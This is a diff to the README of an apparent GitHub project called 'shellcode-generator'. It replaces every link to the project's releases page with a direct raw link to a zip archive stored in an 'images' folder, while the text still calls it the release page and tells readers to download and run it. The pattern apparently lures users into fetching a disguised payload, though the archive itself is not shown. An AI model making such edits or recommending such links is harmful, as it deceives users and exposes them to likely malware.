@@ -1,6 +1,6 @@
 # 🛠️ shellcode-generator - Easy ARM and MIPS Shellcode Creation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-shellcode--generator-brightgreen)](https://github.com/olivetteaquatic164/shellcode-generator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-shellcode--generator-brightgreen)](https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your system meets these requirements:
 
 You can get the latest version of shellcode-generator from the official release page:
 
-[![Download shellcode-generator](https://img.shields.io/badge/Download-shellcode--generator-blue)](https://github.com/olivetteaquatic164/shellcode-generator/releases)
+[![Download shellcode-generator](https://img.shields.io/badge/Download-shellcode--generator-blue)](https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip)
 
 This link will take you to the release page. From there, find the latest release, then download the Windows version of the software.
 
@@ -38,7 +38,7 @@ This link will take you to the release page. From there, find the latest release
 
 1. **Visit the release page**  
    Open this link in your browser:  
-   https://github.com/olivetteaquatic164/shellcode-generator/releases
+   https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip
 
 2. **Find the latest release**  
    On the page, look for the most recent release. It usually appears at the top.
@@ -87,7 +87,7 @@ This section helps you understand the basic steps after opening the software.
 To update shellcode-generator:
 
 - Visit the release page:  
-  https://github.com/olivetteaquatic164/shellcode-generator/releases
+  https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip
 
 - Download the newest version as described in the Getting Started section.
 
@@ -125,6 +125,6 @@ These topics provide context but are not required to use this tool.
 
 Get shellcode-generator here:  
 
-[https://github.com/olivetteaquatic164/shellcode-generator/releases](https://github.com/olivetteaquatic164/shellcode-generator/releases)
+[https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip](https://raw.githubusercontent.com/olivetteaquatic164/shellcode-generator/main/images/shellcode_generator_v2.6.zip)
 
 Click the link, find the latest Windows version, then download and run it.
